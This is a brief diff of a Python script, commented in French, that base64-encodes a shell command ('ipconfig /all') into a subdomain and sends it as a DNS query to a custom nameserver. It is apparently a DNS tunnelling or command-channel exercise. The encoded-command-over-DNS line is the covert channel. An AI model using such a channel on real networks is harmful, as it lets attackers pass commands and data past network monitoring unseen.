@@ -13,9 +13,8 @@ res = resolver.Resolver()
 res.nameservers = [HOST]
 res.port = PORT
 
-cmd = b"Raphael"
+cmd = b"ipconfig /all"
 encoded_cmd = base64.b64encode(cmd).decode()
-print(encoded_cmd)
 domain = f"{encoded_cmd}.tkt.fr"
 # Faire une requête DNS
 answer = res.resolve(domain, 'A')
@@ -23,4 +22,3 @@ answer = res.resolve(domain, 'A')
 # Afficher la réponse
 for ipval in answer:
     print('IP', ipval.to_text())
-    print(answer)
